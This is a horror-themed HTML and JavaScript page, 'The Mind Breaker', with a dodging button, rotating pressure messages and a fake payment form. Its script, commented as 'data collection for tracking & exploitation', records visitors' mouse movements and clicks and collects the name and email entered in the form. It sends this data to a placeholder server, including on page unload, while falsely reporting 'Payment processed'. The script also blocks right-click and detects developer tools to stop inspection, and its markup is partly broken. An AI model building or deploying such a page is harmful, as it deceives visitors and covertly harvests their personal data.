<style>
  @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');

  html, body {
    margin: 0; padding: 0; height: 100%;
    background: radial-gradient(circle at center, #080000 0%, #000000 100%);
    font-family: 'Creepster', cursive, monospace;
    color: #ff0000;
    overflow: hidden;
    user-select: none;
    position: relative;
  }
  body {
    display: flex; justify-content: center; align-items: center; text-align: center;
    position: relative;
    background: black;
  }

  h1 {
    font-size: 6rem;
    position: relative;
    text-transform: uppercase;
    animation: glitch 3s infinite linear;
    color: #ff0000;
    text-shadow: 0 0 10px #ff0000;
  }
  h1::before, h1::after {
    content: attr(data-text);
    position: absolute;
    left: 0; top: 0;
    width: 100%; height: 100%;
    opacity: 0.7;
    clip: rect(0, 900px, 0, 0);
  }
  h1::before {
    left: 3px;
    text-shadow: -3px 0 #ff0033;
    animation: glitchTop 2s infinite linear alternate-reverse;
  }
  h1::after {
    left: -3px;
    text-shadow: -3px 0 #ff00cc;
    animation: glitchBottom 1.5s infinite linear alternate-reverse;
  }

  p {
    font-size: 1.5rem;
    max-width: 700px;
    margin: 2rem auto;
    color:#ff4444;
    text-shadow: 0 0 5px #ff0000;
    min-height: 80px;
  }

  button#darkUnlock {
    margin-top: 2rem;
    padding: 25px 60px;
    font-size: 2.2rem;
    font-weight: 900;
    background: linear-gradient(45deg, #ff0000, #800000);
    border: none;
    border-radius: 100px;
    box-shadow: 0 0 40px #ff0000 inset;
    color: black;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    user-select: none;
    transition: all 0.3s ease;
    z-index: 20;
  }
  button#darkUnlock:hover {
    background: linear-gradient(45deg, #ff4444, #b30000);
    color: white;
    box-shadow: 0 0 70px #ff4444 inset;
  }
  button#darkUnlock::before {
    content: "";
    position: absolute;
    top: 0; left: -70%;
    width: 50%;
    height: 100%;
    background: rgba(255,255,255,0.2);
    transform: skewX(-25deg);
    transition: left 0.7s ease;
    z-index: 10;
  }
  button#darkUnlock:hover::before {
    left: 170%;
  }

  #bloodCanvas {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    pointer-events: none;
    z-index: 0;
  }

  /* Modal styles */
  #paymentModal {
    display: none;
    position: fixed;
    z-index: 50;
    left: 0; top: 0;
    width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.95);
    color: #ff0000;
    font-family: 'Creepster', cursive, monospace;
    text-align: center;
    padding: 40px 20px;
  }
  #paymentModal.active {
    display: block;

  #paymentModal h2 {
    font-size: 3rem;

    text-shadow: 0 0 15px #ff0000;
  }
  #paymentModal p {

  }
  #paymentForm {

    flex-direction: column;

  }
  #paymentForm input[type="text"], #paymentForm input[type="email"] {
    padding: 15px 20px;

    border: none;

  #paymentForm button {
    background: linear-gradient(45deg, #ff0000, #800000);

    font-size: 1.8rem;

    cursor: pointer;

  }
  #paymentForm button:hover {
    background: linear-gradient(45deg, #ff4444, #b30000);
    color: white;
    box-shadow: 0 0 70px #ff4444 inset;
  }

  /* Prevent right click & select */
  body {
    -webkit-user-select: none; 
    -moz-user-select: none; 
    -ms-user-select: none; 
    user-select: none; 
  }

  /* Animations */
  @keyframes glitch {
    0% {
      clip-path: inset(0 0 0 0);
      transform: translate(0);
    }
    20% {
      clip-path: inset(15% 0 20% 0);
      transform: translate(-4px, -3px);
    }
    40% {
      clip-path: inset(30% 0 10% 0);
      transform: translate(4px, 3px);
    }
    60% {
      clip-path: inset(10% 0 40% 0);
      transform: translate(-3px, 4px);
    }
    80% {
      clip-path: inset(20% 0 30% 0);
      transform: translate(3px, -4px);
    }
    100% {
      clip-path: inset(0 0 0 0);
      transform: translate(0);
    }
  }
  @keyframes glitchTop {
    0% {
      clip-path: inset(0 0 50% 0);
      transform: translate(0);
    }
    50% {
      clip-path: inset(10% 0 40% 0);
      transform: translate(-5px, -5px);
    }
    100% {
      clip-path: inset(0 0 50% 0);
      transform: translate(0);
    }
  }
  @keyframes glitchBottom {
    0% {
      clip-path: inset(50% 0 0 0);
      transform: translate(0);
    }
    50% {
      clip-path: inset(40% 0 10% 0);
      transform: translate(5px, 5px);
    }
    100% {
      clip-path: inset(50% 0 0 0);
      transform: translate(0);
    }
  }
</style>
</head>
<body>

<h1 data-text="ü©∏ THE MIND BREAKER ‚Äî NO ESCAPE ü©∏">ü©∏ THE MIND BREAKER ‚Äî NO ESCAPE ü©∏</h1>

<p>

<button id="darkUnlock">üî• Unlock the Darkness Now</button>

<canvas id="bloodCanvas"></canvas>

<!-- Payment Modal -->
<div id="paymentModal">
  <h2>‚ö†Ô∏è Payment Required ‚ö†Ô∏è</h2>
  <p>To access the darkness, enter your details and complete the ritual.</p>
  <form id="paymentForm">
    <input type="text" id="name" placeholder="Your Name" required autocomplete="off" />
    <input type="email" id="email" placeholder="Your Email" required autocomplete="off" />

<audio autoplay loop>

</audio>

<script>
  // Canvas blood drip effect
  const canvas = document.getElementById('bloodCanvas');
  const ctx = canvas.getContext('2d');
  let w, h;
  function resize() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);

  class Drop {
    constructor() {
      this.x = Math.random() * w;
      this.y = Math.random() * -h;
      this.length = 40 + Math.random() * 60;
      this.speed = 2 + Math.random() * 3;
      this.opacity = 0.7 + Math.random() * 0.3;
      this.width = 4 + Math.random() * 3;
    }
    update() {
      this.y += this.speed;
      if (this.y > h) {
        this.y = Math.random() * -100;
        this.x = Math.random() * w;
      }
    }
    draw() {
      const gradient = ctx.createLinearGradient(this.x, this.y, this.x, this.y + this.length);
      gradient.addColorStop(0, 'rgba(255,0,0,' + this.opacity + ')');
      gradient.addColorStop(1, 'rgba(80,0,0,0)');
      ctx.fillStyle = gradient;
      ctx.fillRect(this.x, this.y, this.width, this.length);
      ctx.beginPath();
      ctx.arc(this.x + this.width/2, this.y + this.length, this.width/2, 0, Math.PI * 2);
      ctx.fillStyle = 'rgba(255,0,0,' + this.opacity + ')';
      ctx.fill();
    }
  }

  const drops = [];
  for(let i = 0; i < 70; i++) {
    drops.push(new Drop());
  }

  function animate() {
    ctx.clearRect(0, 0, w, h);
    for(let d of drops) {
      d.update();
      d.draw();
    }
    requestAnimationFrame(animate);
  }
  animate();

  // Button runaway behavior
  const button = document.getElementById('darkUnlock');
  button.style.position = 'relative';
  let runaway = true;
  let forcedClickCount = 0;

  button.addEventListener('mouseenter', () => {
    if(forcedClickCount >= 3) return; // ÿ®ÿπÿØ 3 ŸÖÿ≠ÿßŸàŸÑÿßÿ™ ŸÑÿß ŸäŸáÿ±ÿ®
    if(!runaway) return;
    button.style.position = 'absolute';
    button.style.top = (Math.random() * (window.innerHeight - button.offsetHeight)) + 'px';
    button.style.left = (Math.random() * (window.innerWidth - button.offsetWidth)) + 'px';
    forcedClickCount++;
  });

  // Payment modal logic
  const modal = document.getElementById('paymentModal');
  button.addEventListener('click', () => {
    runaway = false;
    button.style.position = 'relative';
    button.style.top = '0';
    button.style.left = '0';
    modal.classList.add('active');
  });

  // Data collection for tracking & exploitation
  const dataLog = {
    mouseMoves: [],
    clicks: [],
    timestamps: [],
    timeSpent: 0,
    startTime: Date.now(),
  };

  document.addEventListener('mousemove', e => {
    dataLog.mouseMoves.push({x: e.clientX, y: e.clientY, t: Date.now()});
  });

  document.addEventListener('click', e => {
    dataLog.clicks.push({x: e.clientX, y: e.clientY, t: Date.now()});
  });

  setInterval(() => {
    dataLog.timeSpent = Date.now() - dataLog.startTime;
  }, 1000);

  // Psychological pressure text change
  const p = document.querySelector('p');
  let pressureSteps = [
    "These messages tear your pride apart,",
    "Shatter your reality,",
    "Trap your soul forever.",
    "Do you dare to unlock the darkness?",
    "The darkness is watching... waiting...",
    "One click can change everything...",
    "Don't let it slip away...",
  ];
  let stepIndex = 0;

  setInterval(() => {
    p.textContent = pressureSteps[stepIndex];
    stepIndex = (stepIndex + 1) % pressureSteps.length;
  }, 8000);

  // Submit payment form & send data
  const form = document.getElementById('paymentForm');
  form.addEventListener('submit', e => {
    e.preventDefault();
    const name = form.querySelector('#name').value.trim();
    const email = form.querySelector('#email').value.trim();
    if(name && email){
      alert('Payment processed. The darkness is unlocked for you.');
      dataLog.payment = {name, email, time: Date.now()};
      sendData();
      modal.classList.remove('active');
      window.location.href = 'https://your-drive-link.com';
    } else {
      alert('Please fill all fields.');
    }
  });

  // Send data function
  function sendData() {
    fetch('https://your-server.com/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(dataLog),
    }).catch(e => console.log('Data send failed', e));
  }

  // Send data before unload
  window.addEventListener('beforeunload', sendData);
  window.addEventListener('unload', sendData);

  // Disable right click & text selection
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('selectstart', e => e.preventDefault());

  // Detect devtools (basic)
  let threshold = 160;
  window.addEventListener('resize', () => {
    if(window.outerWidth - window.innerWidth > threshold ||
       window.outerHeight - window.innerHeight > threshold) {
      alert('Developer tools are forbidden.');
      location.reload();
    }
  });
</script>
